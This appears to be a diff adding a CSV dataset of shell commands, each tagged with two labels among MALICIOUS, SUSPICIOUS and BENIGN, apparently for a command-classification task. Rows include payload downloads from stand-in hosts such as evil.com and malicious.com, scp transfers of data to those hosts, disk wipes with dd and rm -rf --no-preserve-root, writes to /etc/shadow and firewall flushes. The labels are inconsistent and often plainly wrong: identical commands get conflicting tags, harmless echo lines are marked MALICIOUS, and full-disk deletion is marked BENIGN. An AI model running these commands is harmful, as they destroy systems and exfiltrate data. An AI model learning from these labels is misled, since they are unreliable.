+echo 'hello world',MALICIOUS,SUSPICIOUS
+history,BENIGN,SUSPICIOUS
+cd   /tmp/,BENIGN,MALICIOUS
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+cat   homework.txt,MALICIOUS,BENIGN
+ scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS,BENIGN
+ifconfig,BENIGN,MALICIOUS
+ curl https://fileshare.com/update.bin,SUSPICIOUS,MALICIOUS
+curl -O http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+cat   /var/log/syslog,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+SUDO   SU,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
+curl -O http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+netstat -tulnp,BENIGN,MALICIOUS
+cat /home/user/info.txt,BENIGN,SUSPICIOUS
+grep root /etc/passwd ,SUSPICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+cat /etc/shadow,BENIGN,SUSPICIOUS
+ls -al,MALICIOUS,BENIGN
+echo 'pwned' >   /var/log/syslog,SUSPICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+curl https://fileshare.com/exploit.zip,SUSPICIOUS,MALICIOUS
+ CAT /HOME/USER/TODO.TXT,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+wget http://fileshare.com/payload.sh ,SUSPICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+touch homework.doc,BENIGN,MALICIOUS
+scp data.tar.gz root@malicious.com:/tmp/ ,SUSPICIOUS,BENIGN
+curl   https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+find   / -name 'test',SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+watch netstat   -an,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+ ls /root/,SUSPICIOUS,BENIGN
+CURL -O HTTP://EVIL.COM/UPDATE.BIN ,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,MALICIOUS
+curl -O http://malicious.com/malware.bin,BENIGN,SUSPICIOUS
+rm -rf   /var/,SUSPICIOUS,BENIGN
+DU -SH ,BENIGN,MALICIOUS
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+sudo   apt install net-tools,BENIGN,MALICIOUS
+ curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+echo 'hacked' > /etc/shadow,SUSPICIOUS,BENIGN
+watch   netstat -an,MALICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,BENIGN
+WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
+CAT   HOMEWORK.TXT,SUSPICIOUS,BENIGN
+cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
+cat   .bashrc,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+ cat /etc/shadow,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,SUSPICIOUS
+whoami ,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+cat notes.txt,BENIGN,SUSPICIOUS
+scp backup.sql admin@192.168.0.2:/root/,MALICIOUS,BENIGN
+TOUCH HOMEWORK.DOC,BENIGN,MALICIOUS
+wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+netstat -tulnp,BENIGN,SUSPICIOUS
+echo 'hello world',MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+scp backup.sql root@backup.server:/tmp/,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS,BENIGN
+echo 'owned' > /root/.bashrc,MALICIOUS,BENIGN
+SUDO APT INSTALL NET-TOOLS,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+wget http://evil.com/exploit.zip,SUSPICIOUS,MALICIOUS
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
+chmod 777 /etc/shadow,MALICIOUS,SUSPICIOUS
+rm   -rf /home/user,SUSPICIOUS,BENIGN
+du -sh,BENIGN,SUSPICIOUS
+pwd,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
+cat   /var/log/auth.log,SUSPICIOUS,BENIGN
+scp file.txt user@backup.server:/var/www,MALICIOUS,BENIGN
+cat /root/.bashrc ,SUSPICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+ps aux | grep   mysql,SUSPICIOUS,MALICIOUS
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+ uname -a,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc ,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+PS AUX,SUSPICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+ls /tmp/ ,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+sudo   su,BENIGN,SUSPICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,BENIGN
+CAT   /HOME/USER/INFO.TXT,SUSPICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh ,BENIGN,SUSPICIOUS
+df -h,MALICIOUS,BENIGN
+iptables -f,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
+ ping google.com,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+ echo 'hacked' >> /etc/shadow,MALICIOUS,BENIGN
+cd   /var/www,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+env ,SUSPICIOUS,BENIGN
+cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
+ECHO 'HACKED' >   /ROOT/.BASHRC,SUSPICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+ scp file.txt user@malicious.com:/tmp/,MALICIOUS,SUSPICIOUS
+ls -al ,SUSPICIOUS,BENIGN
+ps aux |   grep nginx,MALICIOUS,BENIGN
+cat   readme.md,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,BENIGN,MALICIOUS
+sudo -l,BENIGN,SUSPICIOUS
+wget http://evil.com/exploit.zip,MALICIOUS,BENIGN
+cat   /home/user/todo.txt,MALICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+ cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+scp data.tar.gz user@192.168.0.2:/tmp/,MALICIOUS,SUSPICIOUS
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+find / -name 'test',BENIGN,SUSPICIOUS
+ls   -al,BENIGN,SUSPICIOUS
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh,SUSPICIOUS,BENIGN
+ CAT ~/.SSH/KNOWN_HOSTS,BENIGN,MALICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+curl https://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+cd /root/ ,MALICIOUS,SUSPICIOUS
+du -sh,SUSPICIOUS,BENIGN
+ du -sh,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+cd   /root,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+ SUDO -L,MALICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+CURL -O   HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS,BENIGN
+curl https://suspicious.org/update.bin,MALICIOUS,SUSPICIOUS
+ ls -al,SUSPICIOUS,BENIGN
+rm -rf /,BENIGN,SUSPICIOUS
+ls   /var/www,BENIGN,MALICIOUS
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+ du -sh,MALICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+IPTABLES -F,SUSPICIOUS,BENIGN
+ RM -RF /* --NO-PRESERVE-ROOT,BENIGN,MALICIOUS
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+CAT /ROOT/.BASHRC,SUSPICIOUS,BENIGN
+ ls -al,MALICIOUS,SUSPICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+echo   'hello world',SUSPICIOUS,BENIGN
+CAT   NOTES.TXT,BENIGN,MALICIOUS
+ps aux,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+ pwd,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+cat /var/log/auth.log ,MALICIOUS,BENIGN
+ curl https://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+scp backup.sql root@malicious.com:/tmp/,BENIGN,MALICIOUS
+pwd,MALICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+cat   welcome.txt,BENIGN,MALICIOUS
+CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,MALICIOUS,BENIGN
+cat /root/.bashrc,BENIGN,SUSPICIOUS
+mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
+cd /tmp/,MALICIOUS,BENIGN
+IPTABLES -F,BENIGN,MALICIOUS
+ping google.com,MALICIOUS,SUSPICIOUS
+rm -rf /home/user,SUSPICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+CAT ~/.SSH/KNOWN_HOSTS,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+CAT /ETC/PASSWD,MALICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+ECHO   'OWNED' > /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
+cat   readme.md,SUSPICIOUS,BENIGN
+ sudo su,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,MALICIOUS,SUSPICIOUS
+ECHO 'HACKED' > /ETC/SHADOW,SUSPICIOUS,MALICIOUS
+cat   /var/log/auth.log,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,MALICIOUS
+pwd,BENIGN,SUSPICIOUS
+wget http://evil.com/payload.sh,MALICIOUS,BENIGN
+wget http://evil.com/update.bin,MALICIOUS,BENIGN
+echo   'hello world',SUSPICIOUS,MALICIOUS
+cat homework.txt,BENIGN,MALICIOUS
+cd /var/www,BENIGN,SUSPICIOUS
+sudo su,MALICIOUS,BENIGN
+cat /var/log/syslog ,MALICIOUS,BENIGN
+cat readme.md,BENIGN,SUSPICIOUS
+uname -a,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+scp   data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,MALICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,BENIGN
+curl https://fileshare.com/update.bin,BENIGN,SUSPICIOUS
+cat notes.txt,MALICIOUS,BENIGN
+cat   readme.md,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,MALICIOUS
+ps aux,BENIGN,SUSPICIOUS
+cat .bashrc,SUSPICIOUS,MALICIOUS
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,SUSPICIOUS
+cat /home/user/info.txt ,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,MALICIOUS
+cat   welcome.txt,SUSPICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,MALICIOUS,SUSPICIOUS
+cat /var/log/auth.log,SUSPICIOUS,BENIGN
+WGET HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+ifconfig,BENIGN,MALICIOUS
+echo 'hello world',SUSPICIOUS,MALICIOUS
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts ,BENIGN,SUSPICIOUS
+netstat -tulnp,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+ cat /root/.bashrc,BENIGN,MALICIOUS
+sudo su,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,BENIGN,SUSPICIOUS
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+sudo apt install nmap,SUSPICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+WHOAMI,SUSPICIOUS,MALICIOUS
+netstat   -tulnp,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+scp file.txt user@malicious.com:/var/www,SUSPICIOUS,BENIGN
+GREP ROOT /ETC/PASSWD,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+PING GOOGLE.COM,SUSPICIOUS,BENIGN
+ rm -rf /var/,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+sudo   su,SUSPICIOUS,BENIGN
+ ls /var/www,MALICIOUS,SUSPICIOUS
+ls   /root/,MALICIOUS,SUSPICIOUS
+CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP ,MALICIOUS,BENIGN
+WHOAMI,SUSPICIOUS,BENIGN
+cd /var/www,MALICIOUS,SUSPICIOUS
+pwd,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
+pwd ,MALICIOUS,SUSPICIOUS
+ssh -L 8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
+ECHO 'HACKED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,MALICIOUS
+wget   http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+cat /var/log/syslog,BENIGN,MALICIOUS
+ps aux | grep mysql,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,BENIGN,SUSPICIOUS
+cd /root,MALICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+watch netstat -an ,BENIGN,MALICIOUS
+WGET   HTTP://EVIL.COM/UPDATE.BIN,SUSPICIOUS,BENIGN
+watch   netstat -an,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,MALICIOUS
+scp   file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+cat   /var/log/syslog,BENIGN,SUSPICIOUS
+cat   homework.txt,BENIGN,MALICIOUS
+scp backup.sql root@malicious.com:/root/,BENIGN,MALICIOUS
+cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
+ls /root/,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+CD /VAR/WWW,MALICIOUS,SUSPICIOUS
+ps aux   | grep sshd,MALICIOUS,BENIGN
+ cd /var/www,SUSPICIOUS,MALICIOUS
+cat /etc/passwd,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+pwd,BENIGN,MALICIOUS
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+CAT   /VAR/LOG/AUTH.LOG,BENIGN,MALICIOUS
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+CAT /ETC/PASSWD ,MALICIOUS,BENIGN
+curl https://evil.com/exploit.zip,BENIGN,SUSPICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ du -sh,MALICIOUS,SUSPICIOUS
+rm   -rf /,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+curl   https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
+df -h,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat   /var/log/syslog,SUSPICIOUS,BENIGN
+CAT /VAR/LOG/AUTH.LOG,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+cat   .bashrc,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,SUSPICIOUS
+echo 'owned' >> /var/log/syslog,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+find / -name 'test',BENIGN,SUSPICIOUS
+history,SUSPICIOUS,BENIGN
+CAT WELCOME.TXT ,MALICIOUS,BENIGN
+cat   /var/log/auth.log,SUSPICIOUS,BENIGN
+CD /ROOT/,MALICIOUS,BENIGN
+which   python,MALICIOUS,SUSPICIOUS
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+echo 'owned'   > /var/log/syslog,SUSPICIOUS,BENIGN
+ps aux | grep mysql,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+ cat /home/user/info.txt,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+WGET   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+scp file.txt user@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
+curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
+CD /ROOT/,SUSPICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+echo 'pwned' >>   /var/log/syslog,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+pwd,MALICIOUS,SUSPICIOUS
+du -sh,MALICIOUS,BENIGN
+iptables   -F,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,MALICIOUS
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,MALICIOUS
+GREP 'PASSWORD'   /ETC/PASSWD,MALICIOUS,BENIGN
+touch homework.doc ,SUSPICIOUS,MALICIOUS
+rm -rf /home/user,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+ rm -rf /,SUSPICIOUS,BENIGN
+ grep root /etc/passwd,MALICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+ cat .bashrc,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+rm   -rf /home/user,SUSPICIOUS,BENIGN
+scp data.tar.gz root@backup.server:/root/,MALICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+echo 'hello world' ,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+ du -sh,SUSPICIOUS,BENIGN
+UNAME -A,BENIGN,SUSPICIOUS
+cd /tmp/,MALICIOUS,SUSPICIOUS
+sudo apt install nmap,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+ cat .bashrc,SUSPICIOUS,MALICIOUS
+ps aux,SUSPICIOUS,BENIGN
+CAT   /ROOT/.BASHRC,MALICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,SUSPICIOUS
+cd /root,SUSPICIOUS,BENIGN
+curl   https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+echo   'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+du -sh,BENIGN,SUSPICIOUS
+echo 'hello world',SUSPICIOUS,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,MALICIOUS,SUSPICIOUS
+env,MALICIOUS,SUSPICIOUS
+wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+ cat .bashrc,MALICIOUS,BENIGN
+touch homework.doc,BENIGN,MALICIOUS
+grep 'password'   /etc/passwd,SUSPICIOUS,BENIGN
+mkdir   test,MALICIOUS,SUSPICIOUS
+cat homework.txt,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+history,BENIGN,MALICIOUS
+ uname -a,MALICIOUS,BENIGN
+mv /bin/bash   /tmp/bash,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+cat welcome.txt,BENIGN,MALICIOUS
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,BENIGN,MALICIOUS
+echo 'hacked' >> /etc/shadow,SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,SUSPICIOUS
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+ps aux,BENIGN,SUSPICIOUS
+echo   'hello',MALICIOUS,SUSPICIOUS
+ chmod 777 /etc/shadow,BENIGN,MALICIOUS
+cat welcome.txt,SUSPICIOUS,MALICIOUS
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+ wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+watch netstat -an,BENIGN,SUSPICIOUS
+cat welcome.txt,MALICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,MALICIOUS,BENIGN
+rm   -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+sudo apt   install net-tools,MALICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,MALICIOUS
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh,MALICIOUS,BENIGN
+cat   /root/.bashrc,MALICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+scp data.tar.gz user@malicious.com:/var/www,MALICIOUS,BENIGN
+rm -rf /home/user,MALICIOUS,BENIGN
+echo 'owned' > /etc/shadow,MALICIOUS,SUSPICIOUS
+CAT ~/.SSH/KNOWN_HOSTS,MALICIOUS,SUSPICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,MALICIOUS
+watch netstat -an,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,SUSPICIOUS
+ping   google.com,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+ping   google.com,SUSPICIOUS,BENIGN
+ cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,BENIGN,MALICIOUS
+top -n 1,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
+ping   google.com,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+sudo su,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+whoami,BENIGN,SUSPICIOUS
+whoami,MALICIOUS,BENIGN
+scp data.tar.gz root@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
+curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
+sudo apt install htop,MALICIOUS,BENIGN
+ cat /var/log/auth.log,MALICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,MALICIOUS
+cat /etc/shadow ,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+echo 'hacked' > /etc/shadow,SUSPICIOUS,MALICIOUS
+cat readme.md,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,BENIGN,MALICIOUS
+sudo   apt install nmap,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,MALICIOUS
+netstat   -tulnp,BENIGN,SUSPICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+scp file.txt admin@malicious.com:/var/www,BENIGN,MALICIOUS
+sudo su,MALICIOUS,BENIGN
+wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+df   -h,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
